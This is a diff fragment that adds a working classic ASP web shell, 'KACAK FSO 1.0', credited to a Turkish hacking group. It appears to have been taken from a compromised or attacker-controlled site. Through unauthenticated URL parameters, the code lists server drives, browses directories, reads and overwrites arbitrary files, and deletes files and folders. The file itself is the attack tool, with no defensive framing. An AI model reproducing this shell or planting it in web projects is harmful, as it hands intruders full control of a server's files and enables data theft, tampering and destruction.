+          <font face="Verdana" style="font-size: 8pt">Boyutu</font></td>
+          <td width="75" height="17" align="center" bgcolor="#C5C5C5">
+          <font face="Verdana" style="font-size: 8pt">Boþ Alan</font></td>
+          <td width="64" height="17" align="center" bgcolor="#C5C5C5">
+          <font face="Verdana" style="font-size: 8pt">Durum</font></td>
+          <td width="62" height="17" align="center" bgcolor="#C5C5C5">
+          <font face="Verdana" style="font-size: 8pt">Ýþlem</font></td>
+        </tr>
+      </table>
+      </center>
+    </div>
+    <div align="center">
+      <center>
+
+
+	<%
+	set klassis =server.createobject("scripting.filesystemobject")
+	set klasdri=klassis.drives
+	%>
+	
+	<%
+	for each dongu in klasdri
+	%>
+			
+	<%
+	if dongu.driveletter <> "A" then
+	if dongu.isready=true then
+	%>
+
+	<%
+	select case dongu.drivetype
+	case 0 teype="Diðer"
+	case 1 teype="Taþýnýr"
+	case 2 teype="HDD"
+	case 3 teype="NetWork"
+	case 4 teype="CD-Rom"
+	case 5 teype="FlashMem"
+	end select
+	%>
+      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber3" height="17">
+        <tr>
+          <td width="208" height="17" align="left" bgcolor="#EEEEEE">
+          <font face="Verdana" style="font-size: 8pt">&nbsp;<%=dongu.driveletter%>:\ ( <%=dongu.filesystem%> )</font></td>
+          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
+          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.totalsize/(1024*1024),1)%> MB</font></td>
+          <td width="75" height="17" align="center" bgcolor="#E0E0E0">
+          <font face="Verdana" style="font-size: 8pt"><%=Round(dongu.availablespace/(1024*1024),1)%> MB</font></td>
+          <td width="64" height="17" align="center" bgcolor="#E0E0E0">
+          <font face="Verdana" style="font-size: 8pt"><%=teype%>&nbsp;</font></td>
+          <td width="62" height="17" align="center" bgcolor="#E0E0E0">
+          <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber24">
+            <tr>
+          <td width="62" height="17" align="center" bgcolor="#E0E0E0"
+          onmouseover="this.style.background='#A0A0A0'"
+          onmouseout="this.style.background='#E0E0E0'"
+          style="CURSOR: hand"
+          
+          >
+          <a href="?klas=<%=dongu.driveletter%>:\" style="text-decoration: none">
+          <font face="Verdana" style="font-size: 8pt" color="#000000">Gir</font></a></td>
+            </tr>
+          </table>
+          </td>
+        </tr>
+      </table>
+
+	<%
+	end if
+	end if
+	%>
+<%
+next
+%>
+
+
+
+      </center>
+    </div>
+    <div align="center">
+      <center>
+      <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="484" id="AutoNumber4" height="4">
+        <tr>
+          <td width="484" height="4" align="center" bgcolor="#C5C5C5">
+          <span style="font-size: 2pt">&nbsp;</span></td>
+        </tr>
+      </table>
+      </center>
+    </div>
+    <p>&nbsp;</p>
+    </td>
+  </tr>
+  <tr>
+    <td width="100%" height="19" bgcolor="#000000">&nbsp;</td>
+  </tr>
+</table>
+
+
+
+
+
+<%
+else
+%>
+
+
+
+
+
+<%
+if request.querystring("kaydet") <> "" then
+set dossisx=server.createobject("scripting.filesystemobject")
+set dosx=dossisx.opentextfile(request.querystring("kaydet"), 2, true)
+dosx.write request("duzenx")
+dosx.close
+set dosyax=nothing
+set dossisx=nothing
+
+end if
+%>
+
+
+
+
+<%
+if request.querystring("duzenle") <> "" then
+set dossis=server.createobject("scripting.filesystemobject")
+set dos=dossis.opentextfile(request.querystring("duzenle"), 1)
+sedx = dos.readall
+dos.close
+set dosya=nothing
+set dossis=nothing
+
+set aktifklas=request.querystring("klas")
+%>
+
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    TC & GH & TC TEAM©<br>
+    </span>Terrorist Crew - GrayHatz Hacking Team - TurkGuvenligi Priv8 Team<br>
+    <span style="font-weight: 700">
+    <br>
+    KACAK FSO 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.grayhatz.org ~ http://www.turkguvenligi.info" style="text-decoration: none">
+    <font color="#858585">www.GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
+    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Dosya</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(request.querystring("duzenle"))%></font></td>
+            <td width="65">
+            &nbsp;</td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#000000">
+    <form method="POST" action="?kaydet=<%=request.querystring("duzenle")%>&klas=<%=aktifklas%>" name="kaypos">
+<p align="center"><b><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#000000" bgcolor="Red"> 
+          <textarea name="duzenx" 
+          style="BACKGROUND-COLOR: #eae9e9; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: left"
+        
+          
+          rows="24" cols="163" wrap="OFF"><%=sedx%></textarea></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+&nbsp;</font></b></p>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber19">
+  <tr>
+    <td width="100%" align="right">
+    <p align="center">
+	<span class="gensmall">
+		<input type="submit" size="16"
+		name="duzenx1" value="Kaydet"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span><a href=""><input type="reset" size="16"
+		name="x" value="Vazgeç"
+		style="BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT: #000000 1px inset; BORDER-RIGHT: #000000 1px inset; BORDER-TOP: #000000 1px inset; COLOR: #000000; FONT-FAMILY: Verdana; FONT-SIZE: 8pt; TEXT-ALIGN: center"
+		</span></a></td>
+  </tr>
+</table>
+</form>
+</td>
+  </tr>
+  <tr>
+    <td width="100%" bgcolor="#EAEAEA">
+    <p align="right">
+	&nbsp;</td>
+  </tr>
+</table>
+
+
+
+<%
+else
+%>
+
+
+<%
+
+if request.querystring("klas") <> "" then
+aktifklas=Request.querystring("klas")
+if request.querystring("usak") = "1" then
+aktifklas=aktifklas & "\"
+end if
+
+else
+aktifklas=server.mappath("/")
+aktifklas=aktifklas & "\"
+end if
+
+if request.querystring("silklas") <> "" then
+set sis=createobject("scripting.filesystemobject")
+silincekklas=request.querystring("silklas")
+sis.deletefolder(silincekklas)
+set sis=nothing
+'response.write(sil & "  Silindi")
+end if
+
+if request.querystring("sildos") <> "" then
+silincekdos=request.querystring("sildos")
+set dosx=createobject("scripting.filesystemobject")
+set dos=dosx.getfile(silincekdos)
+dos.delete
+set dos=nothing
+set dosyasis=nothing
+end if
+
+
+
+
+select case aktifklas
+case "C:" aktifklas="C:\"
+case "D:" aktifklas="D:\"
+case "E:" aktifklas="E:\"
+case "F:" aktifklas="F:\"
+case "G:" aktifklas="G:\"
+case "H:" aktifklas="H:\"
+case "I:" aktifklas="I:\"
+case "J:" aktifklas="J:\"
+case "K:" aktifklas="K:\"
+end select
+
+
+
+if aktifklas=("C:") then aktifklas=("C:\")
+
+Set FS = CreateObject("Scripting.FileSystemObject")
+Set klasor = FS.GetFolder(aktifklas)
+Set altklasorler = klasor.SubFolders
+Set dosyalar = klasor.files
+%>
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber1" height="59">
+  <tr>
+    <td width="70" bgcolor="#000000" height="76">
+    <p align="center">
+    <img border="0" src="http://www.grayhatz.org/forum/dragontwo/logo.jpg"></td>
+    <td width="501" bgcolor="#000000" height="76" valign="top">
+    <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
+    <span style="font-weight: 700">
+    <br>
+    TC & GH & TC TEAM ©<br><br>
+    </span>Terrorist Crew - GrayHatz Hacking Team - TurkGuvenligi Priv8 Team<br>
+    <span style="font-weight: 700">
+    <br>
+    KACAK FSO 1.0</span></font></td>
+    <td width="431" bgcolor="#000000" height="76" valign="top">
+    <p align="right"><span style="font-weight: 700">
+    <font face="Verdana" color="#858585" style="font-size: 2pt"><br>
+    </font><font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+    <a href="http://www.grayhatz.org ~ http://www.turkguvenligi.info" style="text-decoration: none">
+    <font color="#858585">www.GrayHatz ~ TurkGuvenligi.Ýnfo</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;<br>
+    </font></span><font face="Verdana" style="font-size: 8pt" color="#858585">
+    <a href="mailto:BuqX@hotmail.com" style="text-decoration: none">
+    <font color="#858585">BuqX</font></a></font><font face="Verdana" style="font-size: 8pt" color="#B7B7B7"><a href="mailto:BuqX@hootmail.com" style="text-decoration: none"><font color="#858585">@Hotmail.com</font></a></font><font face="Verdana" style="font-size: 8pt" color="#858585">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td width="1004" height="1" bgcolor="#9F9F9F" colspan="3">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" id="AutoNumber5" width="100%" height="20">
+      <tr>
+        <td width="110" bgcolor="#9F9F9F" height="20"><font face="Verdana">
+        <span style="font-size: 8pt">&nbsp;Çalýþýlan Klasör</span></font></td>
+        <td bgcolor="#D6D6D6" height="20">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber4">
+          <tr>
+            <td width="1"></td>
+            <td><font face="Verdana" style="font-size: 8pt">&nbsp;<%=response.write(aktifklas)%></font></td>
+            <td width="65">
+            <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber6" height="13">
+              <tr>
+                <td width="100%" bgcolor="#B7B7B7" bordercolor="#9F9F9F" height="13">
+                <p align="center"><font face="Verdana" style="font-size: 8pt">
+
+                <a href="?usklas=1&klas=<%=server.urlencode(left(aktifklas,(instrRev(aktifklas,"\"))-1))%>" style="text-decoration: none">
+                <font color="#000000">Üst Klasör</font></a></font></td>
+                
+              </tr>
+            </table>
+            </td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+
+
+<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber3" height="21">
+  <tr>
+    <td width="625" bgcolor="#000000"><span style="font-size: 2pt">&nbsp;</span></td>
+  </tr>
+  <tr>
+    <td bgcolor="#000000" height="20">
+    <table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#000000" id="AutoNumber23" bgcolor="#A3A3A3" width="373" height="19">
+      <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber26">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        
+        height="19" bordercolor="#000000">
+        <span style="font-weight: 700">
+        <font face="Verdana" style="font-size: 8pt" color="#9F9F9F">
+        <a href="?suruculer=1" style="text-decoration: none">
+        <font color="#9F9F9F">Sürücüler</font></a></font></span></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber27">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19" 
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+        bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="?klasac=1&aktifklas=<%=aktifklas%>" style="text-decoration: none">
+        <font color="#9F9F9F">Yeni Klasör</font></a></font></td>
+          </tr>
+        </table>
+        </td>
+        <td align="center" bgcolor="#5F5F5F" height="19" bordercolor="#000000">
+        <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber28">
+          <tr>
+        <td align="center" bgcolor="#5F5F5F" height="19"
+        onmouseover="style.background='#6F6F6F'"
+        onmouseout="style.background='#5F5F5F'"
+        style="CURSOR: hand"
+		bordercolor="#000000">
+        <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#9F9F9F">
+        <a href="?yenidosya=<%=aktifklas%>" style="text-decoration: none"><font color="#9F9F9F">Yeni Dosya</font></a> </font></td>
+          </tr>
+        </table>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+  </table>
+
+
+			
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber7" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Tür</font></td>
+    <td height="17" bgcolor="#9F9F9F">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Dosya 
+    Adý</font></td>
+    <td width="122" height="17" bgcolor="#9F9F9F">
+    <p align="center">
+    <font face="Verdana" style="font-size: 8pt; font-weight: 700">&nbsp;Ýþlem</font></td>
+  </tr>
+</table>
+
+
+
+<% For each oge in altklasorler %> 
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="17">
+  <tr>
+    <td width="30" height="17" bgcolor="#808080">
+    <p align="center">
+    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
+    <td height="17" bgcolor="#C4C4C4">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%>&nbsp;</font></td>
+    <td width="61" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber15" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
+        onmouseout="this.style.background='#A3A3A3'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="?klas=<%=aktifklas%><%=oge.name%>\" style="text-decoration: none">
+        <font color="#000000">Aç</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="17" bgcolor="#C4C4C4" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber18" height="20">
+      <tr>
+        <td width="100%" bgcolor="#A3A3A3"
+        onmouseover="this.style.background='#BBBBBB'"
+        onmouseout="this.style.background='#A3A3A3'"
+
+
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="?silklas=<%=aktifklas & oge.name & "&klas=" & aktifklas %>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a>
+
+        </font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+<% Next %>
+			    
+
+<% For each oge in dosyalar %> 
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber8" height="1">
+  <tr>
+    <td width="30" height="1" bgcolor="#B0B0B0">
+    <p align="center">
+    <img border="0" src="http://turkguvenligi.info/blues/statusicon/forum_new.gif"></td>
+    <td height="1" bgcolor="#EAEAEA">
+    <font face="Verdana" style="font-size: 8pt">&nbsp;<%=oge.name%> </font>
+    <font face="Arial Narrow" style="font-size: 8pt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   ( <%=Round(oge.size/1024,1)%> KB )&nbsp;</font></td>
+    <td width="61" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber12" height="20">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6" no wrap
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a style="text-decoration: none" target="_self" href="?duzenle=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>">
+        <font color="#000000">Düzenle</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+    <td width="60" height="1" bgcolor="#D6D6D6" align="center">
+    <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber13" height="20">
+      <tr>
+        <td width="100%" bgcolor="#D6D6D6" no wrap
+        onmouseover="this.style.background='#ACACAC'"
+        onmouseout="this.style.background='#D6D6D6'"
+        style="CURSOR: hand"
+		height="20">
+
+        <p align="center"><font face="Verdana" style="font-size: 8pt">
+        <a href="?sildos=<%=aktifklas%><%=oge.name%>&klas=<%=aktifklas%>" style="text-decoration: none">
+        <font color="#000000">Sil</font></a></font></td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+</table>
+
+<% Next %>
+
+
+
+<%
+if aktifklas=("C:\") then aktifklas=("C:")
+%>
+
+
+<%
+end if
+%>
+
+
+
+<%
+end if
+%>
+
+
+<%
+end if
+%>
+
+
+<%
+end if
+%>
+
+<%
+end if
+%>
+
+
+<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%" id="AutoNumber29">
+  <tr>
+    <td width="100%" bgcolor="#000000">&nbsp;</td>
+  </tr>
+</table>
+
+</body>
